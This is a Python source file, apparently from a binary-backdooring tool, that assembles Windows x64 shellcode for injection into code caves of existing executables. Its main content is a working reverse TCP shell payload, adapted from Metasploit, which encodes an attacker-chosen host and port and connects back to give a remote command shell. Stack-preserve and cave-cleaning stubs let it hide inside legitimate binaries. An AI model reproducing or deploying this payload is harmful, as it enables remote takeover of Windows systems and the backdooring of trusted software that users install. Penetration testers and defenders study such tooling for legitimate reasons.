''''

Copyright (c) 2013-2015, Joshua Pitts
All rights reserved.

Redistribution and use in source and binary forms, with or without modification,
are permitted provided that the following conditions are met:

    1. Redistributions of source code must retain the above copyright notice,
    this list of conditions and the following disclaimer.

    2. Redistributions in binary form must reproduce the above copyright notice,
    this list of conditions and the following disclaimer in the documentation
    and/or other materials provided with the distribution.

    3. Neither the name of the copyright holder nor the names of its contributors
    may be used to endorse or promote products derived from this software without
    specific prior written permission.

THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS"
AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE
LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR
CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF
SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS
INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN
CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE)
ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
POSSIBILITY OF SUCH DAMAGE.

'''

##########################################################
#               BEGIN win64 shellcodes                   #
##########################################################

import struct
from intelmodules import eat_code_caves


class winI64_shellcode():
    """
    Windows Intel x64 shellcode class
    """

    def __init__(self, HOST, PORT, SUPPLIED_SHELLCODE):
        self.HOST = HOST
        self.PORT = PORT
        self.SUPPLIED_SHELLCODE = SUPPLIED_SHELLCODE
        self.shellcode = ""
        self.stackpreserve = ("\x90\x90\x50\x53\x51\x52\x56\x57\x54\x55\x41\x50"
                              "\x41\x51\x41\x52\x41\x53\x41\x54\x41\x55\x41\x56\x41\x57\x9c"
                              )

        self.stackrestore = ("\x9d\x41\x5f\x41\x5e\x41\x5d\x41\x5c\x41\x5b\x41\x5a\x41\x59"
                             "\x41\x58\x5d\x5c\x5f\x5e\x5a\x59\x5b\x58"
                             )
        self.apis_needed = None

    def pack_ip_addresses(self):
        hostocts = []
        for i, octet in enumerate(self.HOST.split('.')):
            hostocts.append(int(octet))
        self.hostip = struct.pack('=BBBB', hostocts[0], hostocts[1],
                                  hostocts[2], hostocts[3])
        return self.hostip

    def returnshellcode(self):
        return self.shellcode

    def clean_caves_stub(self, CavesToFix):
        stub = ("\x48\x31\xC0"                          # xor rax,rax
                "\x48\x31\xC9"                          # xor rcx,rcx
                "\x65\x48\x8B\x49\x60"                  # mov rcx,QWORD PTR gs:[rcx+0x60]
                "\x48\x8B\x49\x10"                      # mov rcx,QWORD PTR [rcx+0x10]
                "\x48\x89\xCB"                          # mov rbx,rcx
                )
        for cave, values in CavesToFix.iteritems():
            stub += "\x48\xbf"                          # mov rdi, value below
            stub += struct.pack("<Q", values[0])
            stub += "\x48\x01\xDF"                      # add rdi, rbx
            stub += "\x48\xb9"                          # mov rcx, value below
            stub += struct.pack("<Q", values[1])
            stub += "\xf3\xaa"                          # REP STOS BYTE PTR ES:[EDI]
        return stub

    def reverse_shell_tcp_inline(self, flItms, CavesPicked={}):
        """
        Modified metasploit windows/x64/shell_reverse_tcp
        """

        if self.PORT is None:
            print ("This payload requires the PORT parameter -P")
            return False

        if self.HOST is None:
            print "This payload requires a HOST parameter -H"
            return False

        breakupvar = eat_code_caves(flItms, 0, 1)

        self.shellcode1 = ("\xfc"
                           "\x48\x83\xe4\xf0"
                           "\xe8")

        if flItms['cave_jumping'] is True:
            if breakupvar > 0:
                if len(self.shellcode1) < breakupvar:
                    self.shellcode1 += struct.pack("<I", int(str(hex(breakupvar - len(self.stackpreserve) -
                                                                     len(self.shellcode1) - 4).rstrip("L")), 16))
                else:
                    self.shellcode1 += struct.pack("<I", int(str(hex(len(self.shellcode1) -
                                                                     breakupvar - len(self.stackpreserve) - 4).rstrip("L")), 16))
            else:
                self.shellcode1 += struct.pack("<I", int('0xffffffff', 16) + breakupvar -
                                               len(self.stackpreserve) - len(self.shellcode1) - 3)
        else:
            self.shellcode1 += "\xc0\x00\x00\x00"

        self.shellcode1 += ("\x41\x51\x41\x50\x52"
                            "\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48"
                            "\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9"
                            "\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41"
                            "\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48"
                            "\x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01"
                            "\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48"
                            "\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0"
                            "\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c"
                            "\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0"
                            "\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04"
                            "\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59"
                            "\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48"
                            "\x8b\x12\xe9\x57\xff\xff\xff")

        self.shellcode2 = ("\x5d\x49\xbe\x77\x73\x32\x5f\x33"
                           "\x32\x00\x00\x41\x56\x49\x89\xe6\x48\x81\xec\xa0\x01\x00\x00"
                           "\x49\x89\xe5\x49\xbc\x02\x00")
        self.shellcode2 += struct.pack('!H', self.PORT)
        self.shellcode2 += self.pack_ip_addresses()
        self.shellcode2 += ("\x41\x54"
                            "\x49\x89\xe4\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07\xff\xd5\x4c"
                            "\x89\xea\x68\x01\x01\x00\x00\x59\x41\xba\x29\x80\x6b\x00\xff"
                            "\xd5\x50\x50\x4d\x31\xc9\x4d\x31\xc0\x48\xff\xc0\x48\x89\xc2"
                            "\x48\xff\xc0\x48\x89\xc1\x41\xba\xea\x0f\xdf\xe0\xff\xd5\x48"
                            "\x89\xc7\x6a\x10\x41\x58\x4c\x89\xe2\x48\x89\xf9\x41\xba\x99"
                            "\xa5\x74\x61\xff\xd5\x48\x81\xc4\x40\x02\x00\x00\x49\xb8\x63"
                            "\x6d\x64\x00\x00\x00\x00\x00\x41\x50\x41\x50\x48\x89\xe2\x57"
                            "\x57\x57\x4d\x31\xc0\x6a\x0d\x59\x41\x50\xe2\xfc\x66\xc7\x44"
                            "\x24\x54\x01\x01\x48\x8d\x44\x24\x18\xc6\x00\x68\x48\x89\xe6"
                            "\x56\x50\x41\x50\x41\x50\x41\x50\x49\xff\xc0\x41\x50\x49\xff"
                            "\xc8\x4d\x89\xc1\x4c\x89\xc1\x41\xba\x79\xcc\x3f\x86\xff\xd5"
                            "\x48\x31\xd2\x90\x90\x90\x8b\x0e\x41\xba\x08\x87\x1d\x60\xff"
                            "\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd\x9d\xff\xd5\x48"
                            "\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13"
                            "\x72\x6f\x6a\x00\x59\x41\x89\xda"
                            "\x48\x81\xc4\xf8\x00\x00\x00"  # Add RSP X ; align stack
                            )

        self.shellcode = self.stackpreserve + self.shellcode1 + self.shellcode2 + self.stackrestore
        return (self.stackpreserve + self.shellcode1, self.shellcode2 + self.stackrestore)

##########################################################
#                 END win64 shellcodes                   #
##########################################################
